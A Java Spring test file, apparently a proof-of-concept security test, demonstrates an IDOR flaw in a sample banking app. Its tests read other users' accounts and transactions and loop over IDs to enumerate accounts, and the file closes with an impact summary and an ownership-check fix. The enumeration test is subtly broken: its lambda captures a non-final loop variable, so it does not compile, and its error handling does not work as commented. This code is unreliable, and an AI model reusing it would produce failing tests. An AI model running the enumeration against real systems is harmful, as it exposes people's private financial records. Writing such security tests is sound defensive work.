package com.securebank.exploit;

import com.securebank.SecureBankApplication;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;

/**
 * EXPLOIT TEST: Insecure Direct Object Reference (IDOR) - CWE-639
 * Location: AccountController.getAccount()
 *
 * This test demonstrates that users can access other users' account information
 * by simply changing the account ID in the URL without proper authorization checks.
 */
@SpringBootTest(classes = SecureBankApplication.class)
@AutoConfigureMockMvc
public class IDORExploitTest {

    @Autowired
    private MockMvc mockMvc;

    /**
     * TEST 1: Access Another User's Account
     * User A can view User B's account details by changing the ID
     */
    @Test
    @WithMockUser(username = "user_a", roles = "USER")
    public void testIDOR_AccessOtherUserAccount() throws Exception {
        // EXPLOIT: User A tries to access account with ID 999 (belongs to another user)
        // There's NO authorization check to verify ownership
        Long targetAccountId = 999L;

        mockMvc.perform(get("/api/accounts/" + targetAccountId))
                .andExpect(status().isOk()); // SUCCESS: Can access without authorization!

        // If account exists, the API returns full account details including:
        // - Account number
        // - Balance
        // - User ID
        // - Account type
        // - Status
    }

    /**
     * TEST 2: Access Another User's Transaction History
     * Similar IDOR vulnerability in transaction endpoint
     */
    @Test
    @WithMockUser(username = "user_a", roles = "USER")
    public void testIDOR_AccessOtherUserTransactions() throws Exception {
        // EXPLOIT: User A tries to access transactions for account 999
        Long targetAccountId = 999L;

        mockMvc.perform(get("/api/accounts/" + targetAccountId + "/transactions"))
                .andExpect(status().isOk()); // SUCCESS: Can view other user's transactions!

        // Returns full transaction history including:
        // - Transaction amounts
        // - From/To accounts
        // - Descriptions
        // - Timestamps
    }

    /**
     * TEST 3: Enumerate All Accounts
     * Attacker can iterate through account IDs to discover all accounts
     */
    @Test
    @WithMockUser(username = "attacker", roles = "USER")
    public void testIDOR_EnumerateAccounts() throws Exception {
        // EXPLOIT: Try multiple account IDs to find valid accounts
        for (long i = 1; i <= 10; i++) {
            try {
                mockMvc.perform(get("/api/accounts/" + i))
                        .andDo(result -> {
                            if (result.getResponse().getStatus() == 200) {
                                System.out.println("Found account with ID: " + i);
                                System.out.println("Response: " + result.getResponse().getContentAsString());
                            }
                        });
            } catch (Exception e) {
                // Account doesn't exist, continue
            }
        }

        // SUCCESS: Attacker can discover and access all accounts in the system
    }

    /**
     * SECURITY IMPACT:
     * - Complete breach of confidentiality
     * - Attacker can view any user's account balance
     * - Access to all transaction history
     * - Can enumerate all accounts in the system
     * - Violation of multi-tenant isolation
     * - Regulatory compliance violation (PCI-DSS, GDPR, etc.)
     *
     * FIX: Add authorization check to verify account ownership:
     * if (!account.getUserId().equals(getCurrentUserId())) {
     *     throw new UnauthorizedException();
     * }
     */
}
